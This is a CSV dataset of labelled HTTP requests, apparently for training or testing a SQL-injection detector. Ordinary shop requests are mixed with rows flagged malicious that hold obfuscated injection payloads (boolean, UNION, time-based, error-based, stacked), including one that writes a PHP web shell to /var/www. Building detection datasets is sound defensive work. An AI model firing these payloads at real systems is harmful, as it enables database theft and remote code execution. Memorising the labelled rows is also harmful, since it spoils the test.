timestamp,source_ip,method,url,params,body,headers,raw_query,is_malicious,attack_type,insertion_point,mutation_type,orig_payload_id,difficulty_score,source_file,Query,Label,Attack_Type,query_hash
2025-05-10T16:43:58Z,10.221.XXX.XXX,POST,/comment,,username=36&comment=69,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=36&comment=69",0.0,,,,,0.0,dataset.csv,,,,cdba88755a29dcae07752543b2343847
2025-08-26T12:30:14Z,10.117.XXX.XXX,POST,/comment,,username=%27%2BUnIoN%2BSeLeCt%2B%27a%27%2C%27b%27%2C%27c%27--%2500&comment=MACHINE LEARNING,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=%27%2BUnIoN%2BSeLeCt%2B%27a%27%2C%27b%27%2C%27c%27--%2500&comment=MACHINE LEARNING",1.0,union,body_form,case_obf,p0039,0.6000000000000001,dataset.csv,,,,b02ec23325d51aa035cfc361bf318883
2025-03-12T19:18:15Z,10.43.XXX.XXX,POST,/api/search,,"{{""user"":""Pants"",""query"":""CAR""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""Pants"",""query"":""CAR""}}",0.0,,,,,0.0,dataset.csv,,,,4d444a4049f0dcbde544e48b28d72d81
2025-08-01T09:36:43Z,10.67.XXX.XXX,POST,/comment,,username=lamp review&comment=Desk,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=lamp review&comment=Desk",0.0,,,,,0.0,dataset.csv,,,,5a2a4c2c2ea08230867a7a508ca3d7ed
2025-09-29T12:27:41Z,10.85.XXX.XXX,GET,/product,"{""id"": ""music price"", ""ref"": ""best shoes""}",,,GET /product?id=music price&ref=best shoes HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,deb3842655802a1e08aa221bb13e2e61
2025-05-24T15:20:37Z,10.110.XXX.XXX,GET,/item/6396/details,,,,GET /item/6396/details HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,5c9bdf3d975cad27e4e0b146a9ee41e6
2025-03-19T09:21:40Z,10.48.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""electronics"",""min_price"":121}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""electronics"",""min_price"":121}}}}",0.0,,,,,0.0,dataset.csv,,,,2b482afe91fd4acfac5638060d0e866a
2025-06-09T06:36:42Z,10.12.XXX.XXX,POST,/comment,,username=movie review&comment=Game,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=movie review&comment=Game",0.0,,,,,0.0,dataset.csv,,,,b69c86397724507dfda003d301c9ab79
2025-03-06T12:53:31Z,10.249.XXX.XXX,GET,/item,"{""id"": ""bed review""}",,,GET /item?id=bed review HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,cee0221af2f5cba142ecc35e3677099a
2025-09-22T00:29:48Z,10.41.XXX.XXX,GET,/product,"{""id"": ""Game"", ""ref"": ""best shirt""}",,,GET /product?id=Game&ref=best shirt HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,9fc252b0c31b977999dffeca2a66a873
2025-05-05T07:01:47Z,10.94.XXX.XXX,GET,/product,"{""id"": ""70"", ""ref"": ""lamp""}",,,GET /product?id=70&ref=lamp HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,3e7bf2d452b2751a2b57cf6cc45bafd3
2025-05-10T15:20:38Z,10.41.XXX.XXX,GET,/product,"{""id"": ""fitness tips 2025"", ""ref"": ""best chair""}",,,GET /product?id=fitness tips 2025&ref=best chair HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,ec4ddd99698d1c22555e9d77c6566790
2025-02-14T02:00:49Z,10.99.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""electronics"",""min_price"":177}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""electronics"",""min_price"":177}}}}",0.0,,,,,0.0,dataset.csv,,,,61d7649c3407f116e09b9a12fc0e620d
2025-09-17T22:51:55Z,10.132.XXX.XXX,GET,/item,"{""id"": ""1 ' OR '1'='1' AND ''='%00%00""}",,,GET /item?id=1 ' OR '1'='1' AND ''='%00%00 HTTP/1.1,1.0,boolean,query_param,hex,p0125,1.0,dataset.csv,,,,f30e5bc99c4d9875a5953e8bd8c2ddd8
2025-04-15T19:13:27Z,10.124.XXX.XXX,GET,/product,"{""id"": ""watch review"", ""ref"": ""best flight tickets""}",,,GET /product?id=watch review&ref=best flight tickets HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,a9b4a74114f5038d929ceafc54f7086a
2025-01-12T07:57:22Z,10.227.XXX.XXX,GET,/item,"{""id"": ""127.0.0.1%2527%2520OR%2520%25271%2527%253D%25271""}",,,GET /item?id=127.0.0.1%2527%2520OR%2520%25271%2527%253D%25271 HTTP/1.1,1.0,header-injection,query_param,whitespace_obf,p0108,0.5,dataset.csv,,,,d6868f09507d61a88734190760352a17
2025-03-17T00:33:54Z,10.1.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""admin%27%20#"",""min_price"":467}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""admin%27%20#"",""min_price"":467}}}}",1.0,boolean,body_json,url_encode,p0028,0.6,dataset.csv,,,,b4f64a1d27f7aae653db5a6d51602b95
2025-05-07T09:59:15Z,10.170.XXX.XXX,GET,/product,"{""id"": ""best mysql database"", ""ref"": ""Lamp""}",,,GET /product?id=best mysql database&ref=Lamp HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,4ef315abddc148adc331cea86bdf5e8d
2025-06-23T06:19:58Z,10.72.XXX.XXX,POST,/api/search,,"{{""user"":""97"",""query"":""Lamp""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""97"",""query"":""Lamp""}}",0.0,,,,,0.0,dataset.csv,,,,156a3a2522bbc0dbe504563989b043a3
2025-04-10T06:03:59Z,10.106.XXX.XXX,POST,/api/search,,"{{""user"":""MACHINE LEARNING"",""query"":""86""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""MACHINE LEARNING"",""query"":""86""}}",0.0,,,,,0.0,dataset.csv,,,,a8111d55593a4dcd975a2f425f7d322f
2025-01-02T18:29:41Z,10.56.XXX.XXX,GET,/item,"{""id"": ""%31%27%20%4f%52%20%27%31%27%3d%27%31%27%20%4c%49%4d%49%54%20%31%2d%2d""}",,,GET /item?id=%31%27%20%4f%52%20%27%31%27%3d%27%31%27%20%4c%49%4d%49%54%20%31%2d%2d HTTP/1.1,1.0,boolean,query_param,case_obf,p0033,0.5,dataset.csv,,,,c6cbc577de0dcc7dd4113454d6982fec
2025-05-21T06:37:35Z,10.242.XXX.XXX,GET,/search,"{""q"": ""1'/**/AND/**/MID(version(),1,1)='5%00""}",,,"GET /search?q=1'/**/AND/**/MID(version(),1,1)='5%00 HTTP/1.1",1.0,blind,query_param,hex,p0104,1.0,dataset.csv,,,,a346b820a071fe8fe89bb45e5652c95d
2025-09-21T01:25:36Z,10.183.XXX.XXX,GET,/search,"{""q"": ""'\tUNION\tSELECT\tNULL,NULL--%00""}",,,"GET /search?q='	UNION	SELECT	NULL,NULL--%00 HTTP/1.1",1.0,union,query_param,whitespace_obf,p0036,0.5,dataset.csv,,,,86d4b0578f663ed97bf08533d370b0bb
2025-04-21T06:07:49Z,10.250.XXX.XXX,GET,/search,"{""q"": ""' UNION SeLEcT 1,'<?phP sysTEM($_GEt[\""CMd\""]); ?>',3 into OutfiLE '/Var/wWw/shelL.pHp'--""}",,,"GET /search?q=' UNION SeLEcT 1,'<?phP sysTEM($_GEt[""CMd""]); ?>',3 into OutfiLE '/Var/wWw/shelL.pHp'-- HTTP/1.1",1.0,union,query_param,hex,p0052,1.0,dataset.csv,,,,5edc19be0c70ae6e78efc3bff576ded1
2025-09-02T22:39:49Z,10.41.XXX.XXX,GET,/product,"{""id"": ""77"", ""ref"": ""best shoes""}",,,GET /product?id=77&ref=best shoes HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,754635ab4fd944d535577de9769108f1
2025-10-06T05:53:38Z,10.197.XXX.XXX,POST,/api/search,,"{{""user"":""healthy recipes"",""query"":""4""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""healthy recipes"",""query"":""4""}}",0.0,,,,,0.0,dataset.csv,,,,2d192828b1bc09d278e370cd2d48c52c
2025-09-20T09:31:46Z,10.34.XXX.XXX,GET,/product,"{""id"": ""battery price"", ""ref"": ""63""}",,,GET /product?id=battery price&ref=63 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,8629696298f162b0a1216857064f98db
2025-02-25T15:50:16Z,10.121.XXX.XXX,POST,/comment,,username=Car&comment=javascript guide 2025,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=Car&comment=javascript guide 2025",0.0,,,,,0.0,dataset.csv,,,,54969c0c73349d755a004e0a647bc24b
2025-09-14T12:54:51Z,10.183.XXX.XXX,POST,/api/search,,"{{""user"":""Helmet"",""query"":""best tire""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""Helmet"",""query"":""best tire""}}",0.0,,,,,0.0,dataset.csv,,,,37d8c5171ec5d36a0adcd78dc096f664
2025-01-31T12:56:08Z,10.61.XXX.XXX,POST,/comment,,username=scooter review&comment=1%27%2520Or%25201%3D1--%2500,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=scooter review&comment=1%27%2520Or%25201%3D1--%2500",1.0,boolean,body_form,hex,p0013,1.0,dataset.csv,,,,dad710ce8231b3f6bade72c2ab114f8f
2025-10-18T20:11:58Z,10.253.XXX.XXX,POST,/comment,,username=mysql database review&comment=REACT DOCUMENTATION,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=mysql database review&comment=REACT DOCUMENTATION",0.0,,,,,0.0,dataset.csv,,,,2d78616df4422b276bc3a84181cf8406
2025-05-29T05:11:22Z,10.168.XXX.XXX,GET,/product,"{""id"": ""shoes price"", ""ref"": ""workout plans price""}",,,GET /product?id=shoes price&ref=workout plans price HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,ab89be7e7ac362f81e2d36cdb7f1dd14
2025-09-16T09:04:26Z,10.83.XXX.XXX,POST,/comment,,username=Highly recommended&comment=7,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=Highly recommended&comment=7",0.0,,,,,0.0,dataset.csv,,,,492c88948497bc8a094c22051b98d4f2
2025-07-12T02:11:30Z,192.168.XXX.XXX,GET,/search,"{""q"": ""127.0.0.1'/**/OR/**/'1'='1%00""}",,,GET /search?q=127.0.0.1'/**/OR/**/'1'='1%00 HTTP/1.1,1.0,header-injection,query_param,none,p0108,0.2,dataset.csv,,,,199a9a5f5cd95145eb7b591a807778f3
2025-04-26T08:01:03Z,10.43.XXX.XXX,GET,/product,"{""id"": ""62"", ""ref"": ""55""}",,,GET /product?id=62&ref=55 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,1309a85d67b0879e5b40eacfe56cfdc8
2025-06-12T17:24:59Z,10.183.XXX.XXX,GET,/search,"{""q"": ""'/**/OR/**/IF(1=1,SLEEP(5),0)--%00""}",,,"GET /search?q='/**/OR/**/IF(1=1,SLEEP(5),0)--%00 HTTP/1.1",1.0,time-based,query_param,base64,p0082,1.0,dataset.csv,,,,e8c3d80427fbb587e444520714c16fd8
2025-01-23T07:33:45Z,10.219.XXX.XXX,POST,/comment,,username=Not bad&comment=helmet,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=Not bad&comment=helmet",0.0,,,,,0.0,dataset.csv,,,,14a7f89c5b66f9fdc4fc558275a63f86
2025-08-04T15:42:25Z,192.168.XXX.XXX,GET,/search,"{""q"": ""';+WAITFOr+DELAY+'0:0:5'--""}",,,GET /search?q=';+WAITFOr+DELAY+'0:0:5'-- HTTP/1.1,1.0,time-based,query_param,hex,p0194,1.0,dataset.csv,,,,3d744c65deb243218cd1459d193b5e54
2025-07-09T17:59:58Z,10.183.XXX.XXX,GET,/product,"{""id"": ""laptop review"", ""ref"": ""Music""}",,,GET /product?id=laptop review&ref=Music HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,87dc055cd3b3e28dcc6b22d1ea2d5cc6
2025-01-09T09:31:46Z,10.117.XXX.XXX,GET,/product,"{""id"": ""camera review"", ""ref"": ""63""}",,,GET /product?id=camera review&ref=63 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,c9329a9049b3f3efea70c09d8773a92e
2025-06-01T17:12:29Z,10.32.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""electronics"",""min_price"":327}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""electronics"",""min_price"":327}}}}",0.0,,,,,0.0,dataset.csv,,,,604f9427561587985c87a4b0f388f187
2025-03-10T11:27:02Z,10.180.XXX.XXX,GET,/product,"{""id"": ""Hat"", ""ref"": ""javascript guide 2025""}",,,GET /product?id=Hat&ref=javascript guide 2025 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,d13b1d4f19f2f7dfc5f3a9fdaf68b98f
2025-01-28T09:52:03Z,10.146.XXX.XXX,POST,/comment,,username=%27%0AOR%0A1%23&comment=3,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=%27%0AOR%0A1%23&comment=3",1.0,boolean,body_form,url_encode,p0017,0.5,dataset.csv,,,,631364241b542a8baa48313aba7d7bf6
2025-08-22T10:34:15Z,10.168.XXX.XXX,POST,/comment,,username=jacket 2025&comment=99,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=jacket 2025&comment=99",0.0,,,,,0.0,dataset.csv,,,,c1a3b4cde87de3185cc1f74ad5d8d943
2025-08-09T12:17:06Z,10.109.XXX.XXX,POST,/api/search,,"{{""user"":""37"",""query"":""camera price""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""37"",""query"":""camera price""}}",0.0,,,,,0.0,dataset.csv,,,,ad4e43ce3b8b1d7696c5ce09bc90179c
2025-07-03T03:47:12Z,10.142.XXX.XXX,GET,/search,"{""q"": ""' UnIoN SeLeCt NULL--%00""}",,,GET /search?q=' UnIoN SeLeCt NULL--%00 HTTP/1.1,1.0,union,query_param,none,p0035,0.2,dataset.csv,,,,6d5c973a2e3238d1a7768fafc54a0ddd
2025-05-04T02:30:39Z,10.210.XXX.XXX,POST,/comment,,username=best web development&comment=chair,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=best web development&comment=chair",0.0,,,,,0.0,dataset.csv,,,,e7c1d51195716de8764855e38e369127
2025-10-15T17:25:11Z,10.250.XXX.XXX,GET,/product,"{""id"": ""bob"", ""ref"": ""admin' OR '1'='1""}",,,GET /product?id=bob&ref=admin' OR '1'='1 HTTP/1.1,1.0,boolean,query_param,none,p0006,0.2,dataset.csv,,,,a072058074e1a7d688c5802472472616
2025-06-02T14:09:00Z,10.202.XXX.XXX,GET,/item/1305/details,,,,GET /item/1305/details HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,bc7b34e7391910c2c9af105ba1652ea0
2025-10-11T13:54:14Z,10.249.XXX.XXX,GET,/product,"{""id"": ""1 '+OR+'something'='something"", ""ref"": ""PHONE""}",,,GET /product?id=1 '+OR+'something'='something&ref=PHONE HTTP/1.1,1.0,boolean,query_param,none,p0010,0.2,dataset.csv,,,,e48b804d2a2d657ec80249bb7ca689c4
2025-10-13T03:24:32Z,10.173.XXX.XXX,POST,/comment,,username=94&comment=music price,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=94&comment=music price",0.0,,,,,0.0,dataset.csv,,,,429463feee38f82777eabad594c8befa
2025-08-05T04:08:12Z,10.245.XXX.XXX,GET,/item,"{""id"": ""JzsgQ1JFQVRFIFRBQkxFIGhhY2tlZChkYXRhIHZhcmNoYXIoMTAwKSktLQ==""}",,,GET /item?id=JzsgQ1JFQVRFIFRBQkxFIGhhY2tlZChkYXRhIHZhcmNoYXIoMTAwKSktLQ== HTTP/1.1,1.0,stacked,query_param,double_encode,p0095,0.7,dataset.csv,,,,8f5219360645bac1b0580bcfb47c8fb2
2025-02-09T12:36:20Z,192.168.XXX.XXX,GET,/product,"{""id"": ""(1'+AND+SLEEP(5)#)"", ""ref"": ""CHAIR""}",,,GET /product?id=(1'+AND+SLEEP(5)#)&ref=CHAIR HTTP/1.1,1.0,time-based,query_param,url_encode,p0192,0.4,dataset.csv,,,,cc2d80a8bd7549b0c7a304f1d763d956
2025-01-22T05:02:14Z,10.172.XXX.XXX,GET,/product,"{""id"": ""bob"", ""ref"": ""41""}",,,GET /product?id=bob&ref=41 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,4f3779ae00f181c58043e889d9720c5a
2025-10-22T20:19:54Z,10.136.XXX.XXX,GET,/product,"{""id"": ""best shelf"", ""ref"": ""table review""}",,,GET /product?id=best shelf&ref=table review HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,8534ea8bb4e267af49319980939b4925
2025-04-04T11:06:12Z,10.226.XXX.XXX,POST,/comment,,username=%252527%2F%25252A%25252A%2FOR%2F%25252A%25252A%2F%2525271%252527%2F%25252A%25252A%2FLIKE%2F%25252A%25252A%2F%2525271&comment=Book,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=%252527%2F%25252A%25252A%2FOR%2F%25252A%25252A%2F%2525271%252527%2F%25252A%25252A%2FLIKE%2F%25252A%25252A%2F%2525271&comment=Book",1.0,boolean,body_form,comment_insert,p0181,0.7,dataset.csv,,,,c0d30de37a518112c2eb6af21588b523
2025-08-08T09:05:50Z,10.220.XXX.XXX,POST,/api/search,,"{{""user"":""71"",""query"":""SOFA""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""71"",""query"":""SOFA""}}",0.0,,,,,0.0,dataset.csv,,,,99b077990d0efd0718798fc75aaa8f5f
2025-06-06T23:29:26Z,10.227.XXX.XXX,POST,/comment,,username=best lamp&comment=67,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=best lamp&comment=67",0.0,,,,,0.0,dataset.csv,,,,391c1b0fb92fd13076ba04a60ca05dca
2025-09-27T09:27:09Z,10.186.XXX.XXX,POST,/comment,,username=best python tutorial&comment=%252527%2F%25252A%25252A%2FAND%2F%25252A%25252A%2F%252528SELECT%2F%25252A%25252A%2F%25252A%2F%25252A%25252A%2FFROM%2F%25252A%25252A%2F%252528SELECT%252528SLEEP%2525280%252529%252529%252529a%252529--,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=best python tutorial&comment=%252527%2F%25252A%25252A%2FAND%2F%25252A%25252A%2F%252528SELECT%2F%25252A%25252A%2F%25252A%2F%25252A%25252A%2FFROM%2F%25252A%25252A%2F%252528SELECT%252528SLEEP%2525280%252529%252529%252529a%252529--",1.0,error,body_form,comment_insert,p0149,0.8999999999999999,dataset.csv,,,,3b6c572ed10c634d808c10f43cc33982
2025-07-01T13:23:56Z,10.172.XXX.XXX,GET,/product,"{""id"": ""lamp"", ""ref"": ""51""}",,,GET /product?id=lamp&ref=51 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,442e1e7206ad66499c473dfd0ec2cfb5
2025-06-02T12:21:05Z,10.180.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""books"",""min_price"":457}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""books"",""min_price"":457}}}}",0.0,,,,,0.0,dataset.csv,,,,b1b72ae9150122d247813dcb578ae775
2025-10-06T08:14:58Z,10.234.XXX.XXX,POST,/api/search,,"{{""user"":""TABLE"",""query"":""helmet review""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""TABLE"",""query"":""helmet review""}}",0.0,,,,,0.0,dataset.csv,,,,b6b84a7c20c2e36cf1d07e197bd3ba85
2025-03-24T02:21:39Z,192.168.XXX.XXX,GET,/search,"{""q"": ""' OR a=a--""}",,,GET /search?q=' OR a=a-- HTTP/1.1,1.0,boolean,query_param,none,p0144,0.2,dataset.csv,,,,2bac050a9a5b422050e1eb123d03be69
2025-09-18T21:27:04Z,10.189.XXX.XXX,POST,/comment,,username=SHIRT&comment=Mysql database,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=SHIRT&comment=Mysql database",0.0,,,,,0.0,dataset.csv,,,,d7a5dddc9ffc1649a281cd63fd56063a
2025-01-11T00:24:04Z,10.185.XXX.XXX,POST,/comment,,username=64&comment=pants price,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=64&comment=pants price",0.0,,,,,0.0,dataset.csv,,,,922a76ef06c5757534fd375b7441fe3d
2025-07-16T19:35:24Z,10.41.XXX.XXX,GET,/product,"{""id"": ""Car"", ""ref"": ""' or 1=1 aNd ROW(1,1)>(sElEct cOUnt(*),cOncAT(CHar(58),chAr(58),floOR(raND(0)*2))x FROM INfoRMATion_sChEMa.pLugins GrOuP bY X lIMit 1)--""}",,,"GET /product?id=Car&ref=' or 1=1 aNd ROW(1,1)>(sElEct cOUnt(*),cOncAT(CHar(58),chAr(58),floOR(raND(0)*2))x FROM INfoRMATion_sChEMa.pLugins GrOuP bY X lIMit 1)-- HTTP/1.1",1.0,error,query_param,double_encode,p0060,0.8999999999999999,dataset.csv,,,,f1e595b488a97fa646be475fa09c0274
2025-06-09T03:07:27Z,10.38.XXX.XXX,GET,/item,"{""id"": ""1' or 1=1#""}",,,GET /item?id=1' or 1=1# HTTP/1.1,1.0,boolean,query_param,url_encode,p0013,0.4,dataset.csv,,,,48b45d9b725e61008f2227c0817d31d0
2025-07-01T19:51:18Z,10.170.XXX.XXX,GET,/item,"{""id"": ""1'%20AND%20SeLeCt%20CASE%20WHEN%20(1=1)%20THEN%201%20ELSE%200%20END""}",,,GET /item?id=1'%20AND%20SeLeCt%20CASE%20WHEN%20(1=1)%20THEN%201%20ELSE%200%20END HTTP/1.1,1.0,blind,query_param,comment_insert,p0167,0.6,dataset.csv,,,,09f05f30ae2c1c8bd8d810bbf7990381
2025-06-21T10:56:05Z,10.74.XXX.XXX,POST,/comment,,username=camera&comment=SOFA,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=camera&comment=SOFA",0.0,,,,,0.0,dataset.csv,,,,919a0df3a3e50be8f2179836f83414f9
2025-04-14T22:28:38Z,10.226.XXX.XXX,GET,/search,"{""q"": ""1' UnIoN SELECT database(),user(),version()--""}",,,"GET /search?q=1' UnIoN SELECT database(),user(),version()-- HTTP/1.1",1.0,union,query_param,none,p0048,0.2,dataset.csv,,,,7d9c46863ed361bd4af78ede415e0dea
2025-08-16T19:06:27Z,10.179.XXX.XXX,POST,/comment,,username=lamp&comment=shoes review,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=lamp&comment=shoes review",0.0,,,,,0.0,dataset.csv,,,,3c2756356a893b31934d94e72b71c359
2025-06-03T12:04:40Z,10.115.XXX.XXX,POST,/api/search,,"{{""user"":""javascript guide"",""query"":""KCcgT1IgJ3gnPSd4KQ==""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""javascript guide"",""query"":""KCcgT1IgJ3gnPSd4KQ==""}}",1.0,boolean,body_json,case_obf,p0177,0.7,dataset.csv,,,,7ed3c939d0b2c7153424a016aa9e549c
2025-08-23T11:42:15Z,10.237.XXX.XXX,GET,/product,"{""id"": ""best workout plans"", ""ref"": ""'+OR+1#""}",,,GET /product?id=best workout plans&ref='+OR+1# HTTP/1.1,1.0,boolean,query_param,hex,p0017,1.0,dataset.csv,,,,762d98d58af727592d5e64dfd5386fe8
2025-07-05T09:18:49Z,10.227.XXX.XXX,GET,/product,"{""id"": ""david"", ""ref"": ""javascript guide 2025""}",,,GET /product?id=david&ref=javascript guide 2025 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,4cbc024ff09eb3242298aae20cc6bd0b
2025-09-02T21:54:00Z,192.168.XXX.XXX,GET,/product,"{""id"": ""' AND (SeLeCt * FROM (SeLeCt(SLEEP(5)))a)--"", ""ref"": ""best watch""}",,,GET /product?id=' AND (SeLeCt * FROM (SeLeCt(SLEEP(5)))a)--&ref=best watch HTTP/1.1,1.0,time-based,query_param,none,p0137,0.2,dataset.csv,,,,86af2d7bb6763c651db84ba6c719552c
2025-06-14T12:37:35Z,10.157.XXX.XXX,GET,/search,"{""q"": ""'))/**/or/**/((1=1""}",,,GET /search?q='))/**/or/**/((1=1 HTTP/1.1,1.0,boolean,query_param,whitespace_obf,p0024,0.5,dataset.csv,,,,bc861c8c81bdae640403cb44635d83fe
